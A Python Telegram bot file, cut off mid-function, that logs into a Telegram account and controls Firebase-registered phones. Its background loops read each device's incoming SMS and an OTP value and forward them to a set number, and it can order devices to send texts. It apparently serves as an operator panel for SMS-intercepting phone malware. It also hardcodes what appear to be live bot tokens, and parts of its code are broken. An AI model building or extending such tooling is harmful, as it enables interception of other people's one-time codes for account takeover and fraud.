#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
import sys
import asyncio
from datetime import datetime
from collections import deque
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeExpiredError, 
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    FloodWaitError,
    RPCError
)
from telethon.tl.functions.auth import SignInRequest

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# BOT TOKENS
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8766524282:AAFKvbFa8hYrEiXiuQACf-F7EsBPrCCB0Tw")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "8847861305:AAE3g8M8LL2erCgKiP_HFmoBhJBcSztDVeo")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "8912251548"))

# ============================
# BOT NAME
# ============================
BOT_NAME = "<b>𝗔𝗡𝗬 𝗔𝗨𝗧𝗢 𝗕𝗢𝗧</b>"

# ============================
# USER CONFIG
# ============================
USER_CONFIG_FILE = "user_config.json"
user_configs = {}
last_otp = {}
processed_messages = set()

# Telethon Clients Storage
telethon_clients = {}  # user_id -> client
telethon_loops = {}    # user_id -> event loop
telethon_lock = threading.Lock()

# Login States
API_ID, API_HASH, PHONE_NUMBER, OTP_CODE, PASSWORD = range(5)

def load_user_configs():
    global user_configs, last_otp
    try:
        if os.path.exists(USER_CONFIG_FILE):
            with open(USER_CONFIG_FILE, "r") as f:
                user_configs = json.load(f)
            for uid, cfg in user_configs.items():
                if "last_otp_value" in cfg:
                    last_otp[uid] = cfg["last_otp_value"]
            logger.info(f"✅ Loaded configs for {len(user_configs)} users")
        else:
            user_configs = {}
    except Exception as e:
        logger.error(f"Config load error: {e}")
        user_configs = {}

def save_user_configs():
    try:
        with open(USER_CONFIG_FILE, "w") as f:
            json.dump(user_configs, f, indent=2)
    except Exception as e:
        logger.error(f"Config save error: {e}")

load_user_configs()

# ============================
# CONVERSATION STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10

# ============================
# SEND STATUS
# ============================
def send_status(user_id, status_type, details):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        if status_type == "login_success":
            text = (
                f"✅ <b>Login Successful!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>User:</b> {details.get('name', 'Unknown')}\n"
                f"📱 <b>Phone:</b> <code>{details.get('phone', 'N/A')}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Status:</b> Connected ✅"
            )
        elif status_type == "error":
            text = f"⚠️ <b>Error:</b> {details.get('error', 'Unknown error')}"
        elif status_type == "status":
            text = f"ℹ️ {details.get('message', 'Processing...')}"
        elif status_type == "otp_resent":
            text = (
                f"🔄 <b>New OTP Sent!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"📱 <b>Phone:</b> <code>{details.get('phone', 'N/A')}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Check your Telegram App or SMS</b>"
            )
        else:
            return
        
        data = {
            "chat_id": int(user_id),
            "text": text,
            "parse_mode": "HTML"
        }
        threading.Thread(target=lambda: requests.post(url, json=data, timeout=5)).start()
    except Exception as e:
        logger.error(f"Status send error: {e}")

# ============================
# GET CLIENT (Thread Safe)
# ============================
def get_client(user_id):
    with telethon_lock:
        return telethon_clients.get(user_id)

def is_logged_in(user_id):
    with telethon_lock:
        return user_id in telethon_clients and telethon_clients[user_id] is not None

# ============================
# START / HELP
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text(
            f"{BOT_NAME} <b>WELCOME</b>\n\n"
            f"<b>Commands:</b>\n"
            f"/login – Login with Telegram Account\n"
            f"/logout – Logout\n"
            f"/status – Check login status\n"
            f"/setup – Configure Firebase & Channel\n"
            f"/devices – Select device and SIM\n"
            f"/setotp – Set forwarding number\n"
            f"/resetforward – Reset old message tracker\n"
            f"/help – Show this message",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Start error: {e}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ============================
# LOGIN SYSTEM
# ============================
async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        if is_logged_in(user_id):
            await update.message.reply_text(
                "<b>✅ Already logged in!</b>\nUse /logout first.",
                parse_mode='HTML'
            )
            return
        
        await update.message.reply_text(
            f"<b>🔐 Telegram Login</b>\n\n"
            f"<b>Step 1/5:</b> Send your <b>API ID</b>\n"
            f"Get it from: https://my.telegram.org/apps\n"
            f"Type /cancel to abort.",
            parse_mode='HTML'
        )
        return API_ID
    except Exception as e:
        logger.error(f"Login start error: {e}")
        return ConversationHandler.END

async def login_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        try:
            api_id = int(update.message.text.strip())
        except ValueError:
            await update.message.reply_text(
                "<b>❌ API ID must be a number!</b>",
                parse_mode='HTML'
            )
            return API_ID
        
        context.user_data['api_id'] = api_id
        await update.message.reply_text(
            f"<b>✅ API ID saved: {api_id}</b>\n\n"
            f"<b>Step 2/5:</b> Send your <b>API Hash</b>",
            parse_mode='HTML'
        )
        return API_HASH
    except Exception as e:
        logger.error(f"Login API ID error: {e}")
        return API_ID

async def login_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        api_hash = update.message.text.strip()
        if len(api_hash) < 10:
            await update.message.reply_text(
                "<b>❌ Invalid API Hash!</b>",
                parse_mode='HTML'
            )
            return API_HASH
        
        context.user_data['api_hash'] = api_hash
        await update.message.reply_text(
            f"<b>✅ API Hash saved</b>\n\n"
            f"<b>Step 3/5:</b> Send your <b>Phone Number</b>\n"
            f"Example: <code>+919876543210</code>",
            parse_mode='HTML'
        )
        return PHONE_NUMBER
    except Exception as e:
        logger.error(f"Login API Hash error: {e}")
        return API_HASH

async def login_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        phone = update.message.text.strip()
        phone = re.sub(r'[^0-9+]', '', phone)
        if not re.match(r"^\+?[0-9]{10,15}$", phone):
            await update.message.reply_text(
                "<b>❌ Invalid Phone Number!</b>\n"
                "Use: +919876543210",
                parse_mode='HTML'
            )
            return PHONE_NUMBER
        
        context.user_data['phone'] = phone
        user_id = str(update.effective_user.id)
        
        await update.message.reply_text(
            f"<b>🔄 Connecting to Telegram...</b>\n\n"
            f"📱 Phone: <code>{phone}</code>\n"
            f"⏳ Please wait...",
            parse_mode='HTML'
        )
        
        # Create event loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        with telethon_lock:
            telethon_loops[user_id] = loop
        
        if user_id not in user_configs:
            user_configs[user_id] = {}
        user_configs[user_id]['phone'] = phone
        save_user_configs()
        
        def do_login():
            try:
                asyncio.set_event_loop(loop)
                loop.run_until_complete(perform_login(user_id, context.user_data['api_id'], context.user_data['api_hash'], phone))
            except Exception as e:
                logger.error(f"Login thread error: {e}")
                send_status(user_id, "error", {"error": str(e)})
        
        threading.Thread(target=do_login, daemon=True).start()
        
        await update.message.reply_text(
            f"<b>📱 OTP Code Sent!</b>\n\n"
            f"<b>Step 4/5:</b> Send the <b>OTP Code</b>\n"
            f"Check your Telegram App or SMS\n"
            f"⚠️ OTP expires in 2 minutes!\n"
            f"Type /cancel to abort.",
            parse_mode='HTML'
        )
        return OTP_CODE
        
    except Exception as e:
        logger.error(f"Login phone error: {e}")
        await update.message.reply_text(f"<b>❌ Error:</b> {str(e)}", parse_mode='HTML')
        return PHONE_NUMBER

async def perform_login(user_id, api_id, api_hash, phone):
    try:
        session_file = f"session_{user_id}"
        if os.path.exists(f"{session_file}.session"):
            os.remove(f"{session_file}.session")
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        if not await client.is_user_authorized():
            try:
                result = await client.send_code_request(phone)
                user_configs[user_id]['phone_code_hash'] = result.phone_code_hash
                user_configs[user_id]['temp_client'] = client
                save_user_configs()
                logger.info(f"✅ OTP sent to {phone}")
                send_status(user_id, "status", {"message": "OTP sent to your Telegram/SMS"})
            except FloodWaitError as e:
                send_status(user_id, "error", {"error": f"Wait {e.seconds} seconds before trying again"})
            except Exception as e:
                send_status(user_id, "error", {"error": f"Failed to send OTP: {str(e)}"})
        else:
            await complete_login(user_id, client, phone)
            
    except Exception as e:
        logger.error(f"Perform login error: {e}")
        send_status(user_id, "error", {"error": str(e)})

async def complete_login(user_id, client, phone):
    try:
        me = await client.get_me()
        
        with telethon_lock:
            telethon_clients[user_id] = client
        
        # Start client in background
        loop = telethon_loops.get(user_id, asyncio.get_event_loop())
        
        @client.on(events.NewMessage)
        async def handler(event):
            await telethon_message_handler(user_id, event)
        
        def run_client():
            try:
                asyncio.set_event_loop(loop)
                loop.run_until_complete(client.run_until_disconnected())
            except Exception as e:
                logger.error(f"Client run error: {e}")
                with telethon_lock:
                    if user_id in telethon_clients:
                        del telethon_clients[user_id]
        
        threading.Thread(target=run_client, daemon=True).start()
        
        user_configs[user_id]['logged_in'] = True
        user_configs[user_id].pop('temp_client', None)
        user_configs[user_id].pop('phone_code_hash', None)
        save_user_configs()
        
        send_status(user_id, "login_success", {
            "name": me.first_name or me.username or "Unknown",
            "phone": phone
        })
        
        logger.info(f"✅ User {user_id} logged in")
        
    except Exception as e:
        logger.error(f"Complete login error: {e}")
        send_status(user_id, "error", {"error": str(e)})

async def login_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        otp = update.message.text.strip()
        
        if not otp.isdigit():
            await update.message.reply_text(
                "<b>❌ OTP must be numbers only!</b>",
                parse_mode='HTML'
            )
            return OTP_CODE
        
        if user_id not in user_configs:
            await update.message.reply_text(
                "<b>❌ Session expired! Use /login again</b>",
                parse_mode='HTML'
            )
            return ConversationHandler.END
        
        client = user_configs[user_id].get('temp_client')
        phone = user_configs[user_id].get('phone')
        phone_code_hash = user_configs[user_id].get('phone_code_hash')
        
        if not client:
            await update.message.reply_text(
                "<b>❌ No active session! Use /login again</b>",
                parse_mode='HTML'
            )
            return ConversationHandler.END
        
        await update.message.reply_text(
            f"<b>🔄 Verifying OTP...</b>",
            parse_mode='HTML'
        )
        
        def verify():
            try:
                loop = telethon_loops.get(user_id, asyncio.new_event_loop())
                asyncio.set_event_loop(loop)
                loop.run_until_complete(verify_otp(user_id, client, phone, otp, phone_code_hash))
            except Exception as e:
                logger.error(f"Verify error: {e}")
                send_status(user_id, "error", {"error": str(e)})
        
        threading.Thread(target=verify, daemon=True).start()
        
        # Wait for verification
        time.sleep(2)
        
        if is_logged_in(user_id):
            await update.message.reply_text(
                f"<b>✅ Login Successful!</b>",
                parse_mode='HTML'
            )
            return ConversationHandler.END
        
        return OTP_CODE
        
    except Exception as e:
        logger.error(f"Login OTP error: {e}")
        await update.message.reply_text(f"<b>❌ Error:</b> {str(e)}", parse_mode='HTML')
        return OTP_CODE

async def verify_otp(user_id, client, phone, otp, phone_code_hash):
    try:
        try:
            await client(SignInRequest(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
                phone_code=otp
            ))
        except PhoneCodeExpiredError:
            send_status(user_id, "status", {"message": "OTP expired! Sending new one..."})
            try:
                result = await client.send_code_request(phone)
                user_configs[user_id]['phone_code_hash'] = result.phone_code_hash
                save_user_configs()
                send_status(user_id, "otp_resent", {"phone": phone})
                await context.bot.send_message(
                    chat_id=int(user_id),
                    text="<b>🔄 New OTP Sent!</b>\n\nPlease send the new OTP code.",
                    parse_mode='HTML'
                )
                return
            except Exception as e:
                send_status(user_id, "error", {"error": f"Failed to resend OTP: {str(e)}"})
                return
        except PhoneCodeInvalidError:
            send_status(user_id, "error", {"error": "Invalid OTP! Try again."})
            return
        except SessionPasswordNeededError:
            user_configs[user_id]['needs_password'] = True
            user_configs[user_id]['temp_client'] = client
            save_user_configs()
            await context.bot.send_message(
                chat_id=int(user_id),
                text="<b>🔐 2FA Password Required!</b>\nSend your password.",
                parse_mode='HTML'
            )
            return
        except Exception as e:
            send_status(user_id, "error", {"error": str(e)})
            return
        
        await complete_login(user_id, client, phone)
        
    except Exception as e:
        logger.error(f"Verify OTP error: {e}")
        send_status(user_id, "error", {"error": str(e)})

async def login_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        password = update.message.text.strip()
        
        if user_id not in user_configs:
            await update.message.reply_text(
                "<b>❌ Session expired!</b>",
                parse_mode='HTML'
            )
            return ConversationHandler.END
        
        client = user_configs[user_id].get('temp_client')
        phone = user_configs[user_id].get('phone')
        
        if not client:
            await update.message.reply_text(
                "<b>❌ No active session!</b>",
                parse_mode='HTML'
            )
            return ConversationHandler.END
        
        await update.message.reply_text(
            f"<b>🔄 Verifying Password...</b>",
            parse_mode='HTML'
        )
        
        try:
            await client.sign_in(password=password)
        except Exception as e:
            await update.message.reply_text(
                f"<b>❌ Invalid password!</b>\nTry again.",
                parse_mode='HTML'
            )
            return
        
        await complete_login(user_id, client, phone)
        
        await update.message.reply_text(
            f"<b>✅ Login Successful!</b>",
            parse_mode='HTML'
        )
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Login password error: {e}")
        await update.message.reply_text(f"<b>❌ Error:</b> {str(e)}", parse_mode='HTML')
        return

async def telethon_message_handler(user_id, event):
    try:
        channel_id = event.chat_id
        if user_id not in user_configs:
            return
        cfg = user_configs[user_id]
        configured_channel = cfg.get('channel_id')
        if configured_channel != channel_id:
            return
        text = event.message.text
        if not text:
            return
        to_number, msg = extract_number_message(text)
        if to_number:
            logger.info(f"📩 Processing for {to_number}")
            # Process SMS (add your SMS sending logic here)
    except Exception as e:
        logger.error(f"Telethon handler error: {e}")

def extract_number_message(text):
    try:
        to_number = None
        msg = None
        patterns = [
            r"To:\s*([\d\+]+).*?Message:\s*(.+)",
            r"📞\s*To:\s*([\d\+]+).*?💬\s*Message:\s*(.+)",
            r"To\s*\(Tap to copy\):\s*([\d\+]+).*?Body\s*\(Tap to copy\):\s*(.+)",
            r"One-tap copy:\s*(.+?)\s*\|\s*(.+)",
        ]
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if match:
                to_number = match.group(1).strip()
                msg = match.group(2).strip()
                break
        if not to_number:
            match = re.search(r"(\+?[0-9]{10,15})", text)
            if match:
                to_number = match.group(1).strip()
                msg = "SMS from bot"
        if not to_number:
            return None, None
        if not msg:
            msg = "SMS from bot"
        return to_number, msg
    except Exception as e:
        logger.error(f"Extract error: {e}")
        return None, None

# ============================
# LOGOUT
# ============================
async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        
        with telethon_lock:
            client = telethon_clients.pop(user_id, None)
            if user_id in telethon_loops:
                telethon_loops.pop(user_id, None)
        
        if client:
            try:
                await client.disconnect()
            except:
                pass
        
        session_file = f"session_{user_id}.session"
        if os.path.exists(session_file):
            os.remove(session_file)
        
        if user_id in user_configs:
            user_configs[user_id]['logged_in'] = False
            user_configs[user_id].pop('temp_client', None)
            user_configs[user_id].pop('phone_code_hash', None)
            save_user_configs()
        
        await update.message.reply_text(
            "<b>✅ Logged out successfully!</b>",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Logout error: {e}")
        await update.message.reply_text(f"<b>❌ Error:</b> {str(e)}", parse_mode='HTML')

# ============================
# STATUS
# ============================
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        
        if is_logged_in(user_id):
            client = get_client(user_id)
            if client:
                try:
                    me = await client.get_me()
                    status_text = (
                        f"<b>✅ Logged In</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━\n"
                        f"👤 <b>Name:</b> {me.first_name or 'Unknown'}\n"
                        f"👤 <b>Username:</b> @{me.username or 'None'}\n"
                        f"📱 <b>Phone:</b> <code>{user_configs.get(user_id, {}).get('phone', 'N/A')}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━━\n"
                        f"✅ <b>Status:</b> Active ✅\n"
                        f"💡 Use /logout to disconnect"
                    )
                except Exception as e:
                    status_text = f"<b>⚠️ Connected but not responsive</b>\nError: {str(e)}"
            else:
                status_text = "<b>⚠️ Logged in but client not available</b>"
        else:
            status_text = (
                f"<b>❌ Not Logged In</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"Use /login to connect your Telegram account"
            )
        
        await update.message.reply_text(status_text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Status error: {e}")
        await update.message.reply_text(f"<b>❌ Error:</b> {str(e)}", parse_mode='HTML')

async def login_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        if user_id in user_configs:
            user_configs[user_id].pop('temp_client', None)
            user_configs[user_id].pop('phone_code_hash', None)
            save_user_configs()
        await update.message.reply_text("<b>❌ Login cancelled.</b>", parse_mode='HTML')
    except Exception as e:
        logger.error(f"Login cancel error: {e}")
    return ConversationHandler.END

# ============================
# RESET FORWARD
# ============================
async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
            return
        selected = get_selected(user_id)
        if not selected or not selected.get("deviceId"):
            await update.message.reply_text("<b>❌ No device selected. Use /devices first.</b>", parse_mode='HTML')
            return
        device_id = selected["deviceId"]
        initialize_processed_keys(user_id, device_id)
        await update.message.reply_text(
            f"<b>✅ Reset successful!</b>\n"
            f"Device: <code>{device_id}</code>",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Reset error: {e}")

# ============================
# FIREBASE HELPERS
# ============================
def firebase_get(user_id, path, retry_count=0):
    try:
        cfg = user_configs.get(str(user_id))
        if not cfg or not cfg.get("firebase_url"):
            return None
        url = f"{cfg['firebase_url']}/{path}.json"
        resp = requests.get(url, timeout=2)
        if resp.status_code == 200:
            return resp.json()
        return None
    except Exception as e:
        logger.error(f"Firebase GET error: {e}")
        return None

def firebase_put(user_id, path, data, retry_count=0):
    try:
        cfg = user_configs.get(str(user_id))
        if not cfg or not cfg.get("firebase_url"):
            return False
        url = f"{cfg['firebase_url']}/{path}.json"
        requests.put(url, json=data, timeout=2)
        return True
    except Exception as e:
        logger.error(f"Firebase PUT error: {e}")
        return False

def get_online_devices(user_id):
    try:
        data = firebase_get(user_id, "clients")
        if not data:
            return {}
        online = {}
        for dev_id, info in data.items():
            if info.get("status") == True:
                online[dev_id] = {
                    "modelName": info.get("modelName", "Unknown"),
                    "sims": info.get("sims", [])
                }
        return online
    except Exception as e:
        logger.error(f"Get devices error: {e}")
        return {}

def get_selected(user_id):
    try:
        cfg = user_configs.get(str(user_id))
        if cfg and "selectedDevice" in cfg:
            return cfg["selectedDevice"]
        return {}
    except Exception as e:
        logger.error(f"Get selected error: {e}")
        return {}

def initialize_processed_keys(user_id, device_id):
    try:
        cfg = user_configs.get(user_id)
        if not cfg:
            return
        msgs = firebase_get(user_id, f"messages/{device_id}")
        keys = list(msgs.keys()) if msgs and isinstance(msgs, dict) else []
        cfg["processed_keys"] = keys
        cfg["processed_device"] = device_id
        save_user_configs()
        logger.info(f"Initialized {len(keys)} keys for {device_id}")
    except Exception as e:
        logger.error(f"Init keys error: {e}")

def set_selected(user_id, device_id, sim_slot, sim_phone):
    try:
        cfg = user_configs.get(str(user_id))
        if cfg:
            cfg["selectedDevice"] = {
                "deviceId": device_id,
                "simSlotIndex": sim_slot,
                "simPhoneNumber": sim_phone
            }
            initialize_processed_keys(str(user_id), device_id)
            save_user_configs()
            logger.info(f"✅ Device selected: {device_id}")
    except Exception as e:
        logger.error(f"Set selected error: {e}")

# ============================
# SMS SEND
# ============================
def send_sms_command(user_id, device_id, to_number, message, from_number, retry_count=0):
    try:
        success = firebase_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {
            "to": to_number,
            "message": message,
            "from": from_number,
            "isSended": False
        })
        if success:
            logger.info(f"📤 SMS sent: {to_number}")
            return True
        elif retry_count < 3:
            time.sleep(0.1)
            return send_sms_command(user_id, device_id, to_number, message, from_number, retry_count+1)
        return False
    except Exception as e:
        logger.error(f"SMS error: {e}")
        return False

def get_otp_number(user_id):
    try:
        cfg = user_configs.get(str(user_id))
        if cfg and "otpNumber" in cfg:
            return cfg["otpNumber"]
        return None
    except Exception as e:
        logger.error(f"Get OTP error: {e}")
        return None

def set_otp_number(user_id, number):
    try:
        cfg = user_configs.get(str(user_id))
        if cfg:
            cfg["otpNumber"] = number
            save_user_configs()
    except Exception as e:
        logger.error(f"Set OTP error: {e}")

# ============================
# SETUP CONVERSATION
# ============================
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        if not is_logged_in(user_id):
            await update.message.reply_text(
                f"<b>⚠️ Please login first!</b>\nUse /login to connect.",
                parse_mode='HTML'
            )
            return
        await update.message.reply_text(
            f"<b>📌 Step 1/2</b>: Send your <b>Firebase URL</b>\n"
            f"Example: <code>https://your-project.firebaseio.com</code>",
            parse_mode='HTML'
        )
        return URL
    except Exception as e:
        logger.error(f"Setup start error: {e}")
        return

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        url = update.message.text.strip()
        if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
            await update.message.reply_text("<b>❌ Invalid URL!</b>", parse_mode='HTML')
            return URL
        context.user_data["firebase_url"] = url
        await update.message.reply_text(
            "<b>✅ URL saved.</b>\n\n<b>Step 2/2</b>: Send your <b>Channel ID</b>",
            parse_mode='HTML'
        )
        return CHANNEL
    except Exception as e:
        logger.error(f"Setup URL error: {e}")
        return URL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        try:
            channel_id = int(update.message.text.strip())
        except ValueError:
            await update.message.reply_text("<b>❌ Must be a number.</b>", parse_mode='HTML')
            return CHANNEL

        user_configs[user_id] = {
            "firebase_url": context.user_data["firebase_url"],
            "channel_id": channel_id,
            "selectedDevice": {},
            "otpNumber": None,
            "processed_keys": [],
            "processed_device": None,
            "logged_in": True
        }
        save_user_configs()

        await update.message.reply_text(
            f"{BOT_NAME} <b>SETUP COMPLETE!</b>\n\n"
            f"✅ Firebase: <code>{context.user_data['firebase_url']}</code>\n"
            f"📢 Channel: <code>{channel_id}</code>\n\n"
            f"Now use /devices to select device",
            parse_mode='HTML'
        )
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Setup channel error: {e}")
        return ConversationHandler.END

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("<b>❌ Setup cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# DEVICES
# ============================
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        
        if not is_logged_in(user_id):
            await update.message.reply_text(
                "<b>❌ Please login first!</b>\nUse /login to connect.",
                parse_mode='HTML'
            )
            return
        
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
            return
        
        online = get_online_devices(user_id)
        if not online:
            await update.message.reply_text("<b>❌ No online devices found.</b>", parse_mode='HTML')
            return
        
        keyboard = []
        for dev_id, data in online.items():
            label = f"📱 {data['modelName']} ({dev_id[:6]}...)"
            keyboard.append([InlineKeyboardButton(label, callback_data=f"dev_{dev_id}")])
        
        await update.message.reply_text(
            "<b>👇 Select your device:</b>",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Devices command error: {e}")
        await update.message.reply_text(f"<b>❌ Error:</b> {str(e)}", parse_mode='HTML')

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = str(update.effective_user.id)
        device_id = query.data.replace("dev_", "")
        
        online = get_online_devices(user_id)
        device_data = online.get(device_id)
        if not device_data:
            await query.edit_message_text("<b>❌ Device offline.</b>", parse_mode='HTML')
            return
        
        sims = device_data.get("sims", [])
        if not sims:
            await query.edit_message_text("<b>❌ No SIMs on this device.</b>", parse_mode='HTML')
            return
        
        keyboard = []
        for sim in sims:
            slot = sim.get("simSlotIndex", "?")
            phone = sim.get("phoneNumber", "N/A")
            callback_data = f"sim_{device_id}_{slot}_{phone}"
            keyboard.append([InlineKeyboardButton(f"📶 SIM {slot} - {phone}", callback_data=callback_data)])
        
        await query.edit_message_text(
            f"<b>📱 Device:</b> <code>{device_data['modelName']}</code>\n<b>Choose SIM:</b>",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Device callback error: {e}")

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = str(update.effective_user.id)
        parts = query.data.split("_")
        if len(parts) < 4:
            await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
            return
        
        device_id = parts[1]
        slot = parts[2]
        phone = parts[3]
        
        set_selected(user_id, device_id, slot, phone)
        
        await query.edit_message_text(
            f"<b>✅ Device Selected!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📱 Device: <code>{device_id}</code>\n"
            f"📶 SIM Slot: <code>{slot}</code>\n"
            f"📞 Phone: <code>{phone}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Now set OTP number using /setotp",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"SIM callback error: {e}")

# ============================
# SET OTP
# ============================
async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
            return
        
        if context.args:
            number = context.args[0]
            if not re.match(r"^\+?[0-9]{10,15}$", number):
                await update.message.reply_text("<b>❌ Invalid number. Use /setotp +919876543210</b>", parse_mode='HTML')
                return
            set_otp_number(user_id, number)
            await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
            return
        
        await update.message.reply_text(
            "<b>📞 Send phone number (with country code):</b>\n"
            "Example: <code>+919876543210</code>\n"
            "Type /cancel to abort.",
            parse_mode='HTML'
        )
        return WAITING_OTP_NUMBER
    except Exception as e:
        logger.error(f"Set OTP error: {e}")
        return WAITING_OTP_NUMBER

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        number = update.message.text.strip()
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text("<b>❌ Invalid number. Try again.</b>", parse_mode='HTML')
            return WAITING_OTP_NUMBER
        set_otp_number(user_id, number)
        await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"OTP input error: {e}")
        return WAITING_OTP_NUMBER

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# POLLING FUNCTIONS
# ============================
def poll_otp_updates():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                try:
                    otp_number = get_otp_number(user_id)
                    if not otp_number:
                        continue
                    selected = get_selected(user_id)
                    if not selected or not selected.get("deviceId"):
                        continue
                    otp_data = firebase_get(user_id, "otp")
                    if otp_data is None:
                        continue
                    current_otp = str(otp_data).strip()
                    if user_id not in last_otp or last_otp[user_id] != current_otp:
                        last_otp[user_id] = current_otp
                        cfg = user_configs.get(user_id)
                        if cfg:
                            cfg["last_otp_value"] = current_otp
                            save_user_configs()
                        device_id = selected["deviceId"]
                        from_number = selected.get("simPhoneNumber", "Unknown")
                        send_sms_command(user_id, device_id, otp_number, current_otp, from_number)
                        logger.info(f"✅ OTP forwarded: {current_otp}")
                except:
                    pass
        except:
            pass
        time.sleep(0.3)

def poll_incoming_messages():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                try:
                    forward_number = get_otp_number(user_id)
                    if not forward_number:
                        continue
                    selected = get_selected(user_id)
                    if not selected or not selected.get("deviceId"):
                        continue
                    device_id = selected["deviceId"]
                    from_number = selected.get("simPhoneNumber", "Unknown")
                    cfg = user_configs.get(str(user_id), {})
                    processed_keys = cfg.get("processed_keys", [])
                    processed_device = cfg.get("processed_device")
                    if processed_device != device_id:
                        initialize_processed_keys(str(user_id), device_id)
                        processed_keys = cfg.get("processed_keys", [])
                    processed_set = set(processed_keys)
                    device_msgs = firebase_get(user_id, f"messages/{device_id}")
                    if not device_msgs or not isinstance(device_msgs, dict):
                        continue
                    new_keys = []
                    for msg_key, msg_data in device_msgs.items():
                        if not isinstance(msg_data, dict):
                            continue
                        if msg_data.get("type") != "incoming":
                            continue
                        if msg_key not in processed_set:
                            msg_text = msg_data.get("message", "")
                            if msg_text and len(msg_text) > 3:
                                send_sms_command(user_id, device_id, forward_number, msg_text, from_number)
                                logger.info(f"📥 Incoming forwarded")
                                new_keys.append(msg_key)
                    if new_keys:
                        processed_keys.extend(new_keys)
